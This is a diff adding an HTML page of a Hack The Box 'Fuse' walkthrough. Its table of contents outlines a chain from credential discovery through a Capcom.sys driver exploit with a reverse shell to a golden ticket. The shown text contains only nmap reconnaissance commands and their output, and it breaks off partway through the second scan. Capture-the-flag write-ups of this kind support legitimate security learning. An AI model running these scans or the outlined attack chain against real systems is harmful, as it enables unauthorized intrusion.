@@ -1,0 +1,2293 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.136.2">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Fuse HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Fuse HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/driverexploit/" title="./driverexploit/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Fuse HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.18.10"
+                            >2024.18.10
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        18 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/medium/"
+                            class="tag-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/seloaddriverprivilege/"
+                            class="tag-btn">
+                            SeLoadDriverPrivilege
+                        </a>
+                    
+                        <a
+                            href="/tags/rpc/"
+                            class="tag-btn">
+                            RPC
+                        </a>
+                    
+                        <a
+                            href="/tags/capcom/"
+                            class="tag-btn">
+                            Capcom
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/fuse-box/" class="bread-btn">
+    
+
+    
+        
+            Fuse HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fuse-hack-the-box-walkthrough-writeup">Fuse Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
+        <li><a href="#rpc">RPC:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#http-80">HTTP <code>80</code>:</a></li>
+        <li><a href="#finding-a-password-in-the-printer-logs">Finding a password in the Printer Logs:</a></li>
+        <li><a href="#changing-the-expired-password">Changing the expired password:</a></li>
+        <li><a href="#preparing-commands-to-access-smb">Preparing commands to access SMB:</a></li>
+        <li><a href="#downloading-the-entire-print-share">Downloading the entire <code>print$</code> share:</a></li>
+        <li><a href="#trying-to-dump-user-information-via-ldapsearch">Trying to dump user information via <code>ldapsearch</code>:</a></li>
+        <li><a href="#enumerating-using-rpcclient">Enumerating using <code>rpcclient</code>:</a></li>
+        <li><a href="#finding-a-hard-coded-clear-text-credential-a-printer-description">Finding a hard-coded clear text credential a printer description:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#enumerating-as-svc-print">Enumerating as <code>svc-print</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#finding-out-we-have-the-seloaddriverprivilege-privilege">Finding out we have the <code>SeLoadDriverPrivilege</code> privilege:</a></li>
+        <li><a href="#checking-the-system-is-vulnerable-to-the-exploit">Checking the system is vulnerable to the exploit:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-ownership">4. Ownership:</a>
+      <ul>
+        <li><a href="#capcom-dot-sys-driver-vulnerability-arbitrary-code-execution-with-system-privileges"><code>Capcom.sys</code> Driver Vulnerability: Arbitrary Code Execution with <code>SYSTEM</code> Privileges</a></li>
+        <li><a href="#download-a-copy-of-the-official-capcom-dot-sys-driver">Download A Copy of the official <code>Capcom.sys</code> Driver:</a></li>
+        <li><a href="#compiling-the-eoploaddriver-tool-to-enable-us-to-load-the-capcom-dot-sys-driver">Compiling the <code>EopLoadDriver</code> tool to enable us to load the <code>Capcom.sys</code> driver:</a></li>
+        <li><a href="#compiling-the-exploitcapcom-exploit-c-plus-plus-project">Compiling the <code>ExploitCapcom</code> exploit <code>C++</code> project:</a></li>
+        <li><a href="#modifying-exploitcapcom-exploit-to-enable-a-reverse-shell">Modifying <code>ExploitCapcom</code> exploit to enable a reverse shell:</a></li>
+        <li><a href="#generating-our-reverse-shell-payload-using-msfvenom">Generating our reverse-shell payload using <code>msfvenom</code>:</a></li>
+        <li><a href="#run-the-exploit-chain-on-the-victim">Run the exploit chain on the victim:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-persistence">5. Persistence:</a>
+      <ul>
+        <li><a href="#creating-a-golden-ticket-with-mimikatz">Creating a Golden Ticket with <code>mimikatz</code>:</a></li>
+        <li><a href="#full-dcsync-attack-using-netexec-and-golden-ticket">Full DCSync attack using <code>netexec</code> and Golden Ticket:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="fuse-hack-the-box-walkthrough-writeup">Fuse Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Fuse">https://app.hackthebox.com/machines/Fuse</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li><strong>Variables</strong>:
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Wordlists</strong>:
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<ul>
+<li>
+<p><strong>Basic Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA basicScan</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%2046.02-HTB/BlogEntriesMade/Fuse/scans/nmap%20%203GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2013:44:19%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-16%2013:44%20BST%0aNmap%20scan%20report%20for%2010.129.2.5%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%20988%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a80/tcp%20%20%20open%20%20http%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2011.37%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 13:44:19 zsh ❯ nmap $box -Pn -oA basicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-16 13:44 BST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.2.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">988</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp   open  domain
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.37 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>DNS, Web, Kerberos, LDAP, SMB are all great targets.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>In depth scan</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%2046.02-HTB/BlogEntriesMade/Fuse/scans/nmap%20%203GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2011s%0a%f0%9f%95%99%2013:44:41%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-16%2013:46%20BST%0aNmap%20scan%20report%20for%2010.129.2.5%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%2065514%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a80/tcp%20%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%2010.0%0a%7c%20http-methods:%0a%7c_%20%20Potentially%20risky%20methods:%20TRACE%0a%7c_http-server-header:%20Microsoft-IIS/10.0%0a%7c_http-title:%20Site%20doesn%27t%20have%20a%20title%20%28text/html%29.%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-10-16%2013:01:33Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20fabricorp.local,%20Site:%20Default-First-Site-Name%29%0a445/tcp%20%20%20open%20%20microsoft-ds%20Windows%20Server%202016%20Standard%2014393%20microsoft-ds%20%28workgroup:%20FABRICORP%29%0a464/tcp%20%20%20open%20%20kpasswd5?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20tcpwrapped%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20fabricorp.local,%20Site:%20Default-First-Site-Name%29%0a3269/tcp%20%20open%20%20tcpwrapped%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-title:%20Not%20Found%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a9389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20.NET%20Message%20Framing%0a49666/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49675/tcp%20open%20%20ncacn_http%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a49676/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49680/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49698/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49755/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0aWarning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0aDevice%20type:%20general%20purpose%0aRunning%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202016%20%2889%25%29%0aOS%20CPE:%20cpe:/o:microsoft:windows_server_2016%0aAggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202016%20%2889%25%29%0aNo%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0aService%20Info:%20Host:%20FUSE;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0aHost%20script%20results:%0a%7c%20smb-security-mode:%0a%7c%20%20%20account_used:%20%3cblank%3e%0a%7c%20%20%20authentication_level:%20user%0a%7c%20%20%20challenge_response:%20supported%0a%7c_%20%20message_signing:%20required%0a%7c%20smb2-time:%0a%7c%20%20%20date:%202024-10-16T13:02:27%0a%7c_%20%20start_date:%202024-10-16T12:39:39%0a%7c%20smb-os-discovery:%0a%7c%20%20%20OS:%20Windows%20Server%202016%20Standard%2014393%20%28Windows%20Server%202016%20Standard%206.3%29%0a%7c%20%20%20Computer%20name:%20Fuse%0a%7c%20%20%20NetBIOS%20computer%20name:%20FUSE%5cx00%0a%7c%20%20%20Domain%20name:%20fabricorp.local%0a%7c%20%20%20Forest%20name:%20fabricorp.local%0a%7c%20%20%20FQDN:%20Fuse.fabricorp.local%0a%7c_%20%20System%20time:%202024-10-16T06:02:28-07:00%0a%7c_clock-skew:%20mean:%202h33m00s,%20deviation:%204h02m31s,%20median:%2012m59s%0a%7c%20smb2-security-mode:%0a%7c%20%20%203:1:1:%0a%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%0aOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20237.63%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in 46.02-HTB/BlogEntriesMade/Fuse/scans/nmap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 11s
+</span></span><span style="display:flex;"><span>🕙 13:44:41 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-16 13:46 BST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.2.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65514</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
